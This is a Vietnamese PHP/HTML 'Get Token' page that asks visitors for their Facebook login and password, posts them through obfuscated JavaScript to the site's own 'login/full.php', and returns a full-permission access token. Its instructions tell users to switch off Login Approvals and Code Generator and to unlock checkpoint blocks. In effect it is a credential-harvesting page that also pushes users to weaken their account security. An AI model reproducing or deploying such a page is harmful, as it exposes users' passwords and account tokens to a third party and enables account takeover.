<?php require("../_cnF/_star_cn_F.php"); ?>
<html encoding="utf-8">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>Token IPHONE || Token ANDROID || Token IOS || Token HTC || Get Token Full Quyền - <?=$text['linkvh'];?></title> 
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</head>
<body id="dashboard" class="background-dark template-product" ><br>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90935031-1', 'auto');
  ga('send', 'pageview');

</script>
<div class="col-sm-3 blog-main"></div>
          <div class="col-sm-6 blog-main">
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">Get Token</h3>
                    </div>
                    <div class="panel-body">
						<div class="form-group">
						Những Trường (*) Là Trường Bắt Buộc.
						</div>
                         <div class="form-group">
                              <label for="email">Tài Khoản FACEBOOK (*)</label>
                              <input id="email" placeholder="Nhập Email Hoặc SĐT Hoặc Tài Khoản Facebook..." class="form-control"/>
                         </div>
                         <div class="form-group">
							  <label for="password">Mật Khẩu FACEBOOK (*)</label>
                              <input id="password" type="password" placeholder="Nhập Mật Khẩu Facebook..." class="form-control"/>
                         </div>
                         <div class="form-group">
                              <label for="app_id">Ứng Dụng Đăng Nhập (*)</label>
                              <select id="app_id" class="form-control">
								<option value="6628568379">FACEBOOK FOR IPHONE</option>
								<option value="350685531728">FACEBOOK FOR ANDROID</option>
								<option value="165907476854626">PAGES MANAGER FOR IOS</option>
								<option value="41158896424">HTC Sense</option> 
                              </select>
                         </div>
                         <div class="form-group text-center">
                              <button id="submit" class="btn btn-sm btn-primary">Get Token</button>
                         </div>
                         <div class="form-group text-center" id="load_result" style="display:none">
                              <label for="result"><center>Access Token Của Bạn</center></label>
                              <textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="4"></textarea>
                         </div>
                    </div>
               </div>
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">Lưu Ý</h3>
                    </div><br>
                    <ol>
						<li>Lần Đầu Đăng Nhập Có Thể Sẽ Không Đăng Nhập Được.</li>
						<li>Mật Khẩu Có Khoảng Trắng Hoặc Kí Tự Đặc Biệt Sẽ Không Đăng Nhập Được. </li>
						<li>Sử Dụng SĐT, Nếu Không Đăng Nhập Được, Bạn Hãy Thay Đầu Số 01|09 Thành 841|849.</li>
						<li>VD: <font color="red"><b>01</b></font>223456789 Thay Thành <font color="red"><b>841</b></font>223456789.</li>
                       <li>Bạn Vào <b>Cài Đặt</b> --&gt; <b>Bảo Mật</b> --&gt; <b>Xét Duyệt Đăng Nhập </b> (Tắt) Giống <div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="../img/6.png" width="550" height="320">
                       </ul></div></li>
                       <li>Bạn Vào <b>Cài Đặt</b> --&gt; <b>Bảo Mật</b> --&gt; <b>Trình Tạo Mã</b> (Tắt) Giống <div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="../img/7.png" width="550" height="320">
                       </ul></div></li>
                       <li>Nếu Bị Khóa (CheckPoint). Hãy Mở Nó Như Sau <div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="../img/8.png" width="550" height="320">
                       </ul></div></li>
                       <li>Sau Đó Ấn <code>Tiếp Tục</code></li>
                       <li>Bây Giờ Lấy Token Thôi ^^.</li>
                    </ol>
               </div>
     </div>
</body>
</html>


<script>
var array = ["click", "#submit", "disabled", "attr", "Chờ Một Phút", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "login/full.php", "post", "ajax", "on"];
$(document)[array[20]](array[0], array[1], function () {
        $(array[1])[array[3]](array[2], array[2]), $(array[1])[array[5]](array[4]);
        var email = $(array[7])[array[6]](),
            password = $(array[8])[array[6]](),
            app_id = $(array[9])[array[6]]();
        $[array[19]]({
            url: array[17],
            type: array[18],
            data: {
                email: email,
                password: password,
                app_id: app_id
            },
            success: function (email) {
                $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](email)
            }
        })[array[16]](function () {
            $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](array[14])
        })
    })
</script>